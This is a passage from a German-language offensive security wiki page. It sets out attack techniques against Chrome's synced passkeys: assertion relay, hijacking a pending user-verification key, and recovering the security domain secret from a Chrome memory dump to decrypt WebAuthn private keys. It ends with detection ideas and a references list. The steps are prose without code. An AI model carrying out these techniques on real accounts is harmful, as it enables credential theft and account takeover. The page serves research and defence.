- Die zurückgegebene Assertion an die Relying Party weiterleiten.
- Dies ist besonders wertvoll, wenn die RP `userVerification=preferred` akzeptiert oder Assertions mit **`UV=0`** nicht zurückweist.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- Das erneute Onboarding erzwingen, indem `passkey_enclave_state` gelöscht oder eine gültig signierte `device/forget`-Operation gesendet wird.
- Wenn das Onboarding das Gerät in **`uv_key_pending`** zurücklässt, einen vom Angreifer kontrollierten öffentlichen UV-Schlüssel registrieren.
- Wenn der Provider die Attestation bzw. den Ursprung der sicheren Hardware für den neuen UV-Schlüssel nicht überprüft, werden spätere Signaturen des Angreifer-Schlüssels als **`UV=1`** behandelt.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Die Wiederherstellung oder den erneuten Beitritt erzwingen, damit Chrome das synchronisierte Passkey-Master-Secret abruft.
- Die Neuerstellung/Änderung von `passkey_enclave_state` überwachen und anschließend einen Dump des Chrome-Speichers erstellen, während das Klartext-**security domain secret (SDS)** resident ist.
- Das wiederhergestellte SDS verwenden, um die verschlüsselten Felder in jedem `WebauthnCredentialSpecifics`-Datensatz zu entschlüsseln und portable WebAuthn-Private-Keys wiederherzustellen.

### DFIR / Erkennungsideen

- Die **Löschung/Neuerstellung** von `passkey_enclave_state` überwachen.<sup>[[4]](#references)</sup>
- Bei ungewöhnlichem Zugriff nicht browserbasierter Prozesse auf Chromes **`Sync Data\LevelDB`** alarmieren.
- Bei **Chrome-Speicher-Dumps** oder verdächtigem prozessübergreifendem Speicherzugriff alarmieren.
- Wiederholte Aufforderungen zur Eingabe der **Google Password Manager recovery PIN** oder unerwartetes erneutes Onboarding untersuchen.
- Beachten, dass WebAuthn **`signCount`** bei synchronisierten Passkeys oft nicht nützlich ist, da der Wert konstant bleiben kann; daher ist die klassische Clone-Erkennung schwach.

## References

- [1] [Unit 42 – Eine Untersuchung jahrelang unentdeckter Operationen gegen hochwertige Sektoren](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Macro-Phishing über SMTP → Entschlüsselung von hMailServer-Credentials → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Im Inneren von Ink Dragon: Das Relay-Netzwerk und die Funktionsweise einer verdeckten offensiven Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Den Passkey weitergeben: Eine neuartige Angriffsfläche bei passwortloser Authentifizierung](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG-Schlüsselspeicherung](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows hacken: Angriffe auf Microsoft-Systeme und -Netzwerke](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [So funktioniert der Active-Directory-Datenspeicher wirklich: Einblicke in NTDS.dit (Teil 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Remote-Lsass-Dump von Passwörtern](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho erweitert sein Cyber-Spionage-Arsenal mit dem Still Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW-Funktion und `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B`-Backupmodus](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram-FAQ – Beenden aktiver Sitzungen](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
